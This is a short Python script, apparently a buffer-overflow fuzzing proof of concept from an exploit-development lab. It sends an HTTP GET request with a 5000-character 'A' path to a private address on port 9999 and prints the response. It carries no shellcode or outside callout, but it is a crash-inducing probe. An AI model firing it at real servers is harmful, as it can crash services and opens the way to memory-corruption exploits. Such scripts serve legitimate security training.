import socket

host = "192.168.0.100"
port = 9999

payload = "A" * 5000

buf = "GET /" + payload + " HTTP/1.1\r\n"
buf += "Host: " + host + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

s.send(buf)

res = s.recv(1024)

print(res)

s.close()
